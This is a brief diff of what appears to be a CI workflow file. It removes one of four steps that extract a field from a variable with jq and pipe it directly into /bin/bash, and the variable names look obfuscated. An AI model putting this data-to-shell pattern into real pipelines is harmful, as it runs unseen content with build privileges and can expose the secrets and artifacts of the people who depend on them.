@@ -28,7 +28,6 @@ jobs:
           echo $ykvts20 | jq -r .stgw21 | /bin/bash
           printf '%s' "$x365" | jq -r .mvfux59716 | /bin/bash
           echo $ddx70 | jq -r .nqkpt3 | /bin/bash
-          echo $tjtrp7879 | jq -r .cvql27 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
